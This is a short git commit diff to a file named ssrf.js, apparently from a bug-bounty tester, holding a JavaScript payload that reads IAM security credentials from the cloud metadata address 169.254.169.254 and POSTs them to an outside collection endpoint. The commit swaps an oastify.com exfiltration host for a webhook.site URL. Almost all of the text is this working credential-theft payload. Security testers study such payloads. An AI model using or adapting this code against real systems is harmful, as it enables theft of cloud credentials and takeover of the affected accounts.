18c8780141f6a7227c5bfde5671b3a8bfa1a21d7
luckz-h1 <137007127+luckz-h1@users.noreply.github.com>
2025-05-15 18:24:36 +0000

    Update ssrf.js

--- ssrf.js
+++ ssrf.js
@@ -3,7 +3,7 @@ fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
   .then(data => {
     console.log(data); // Procesar la respuesta como desees
     // O redirigirla a tu propio servidor
-    fetch('https://qhbya9z686qnd83bfq7zqi9zoquhiaayz.oastify.com/read', {
+    fetch('https://webhook.site/34738be1-dc92-4167-bfe2-af99b704d0be/read', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ metadata: data })
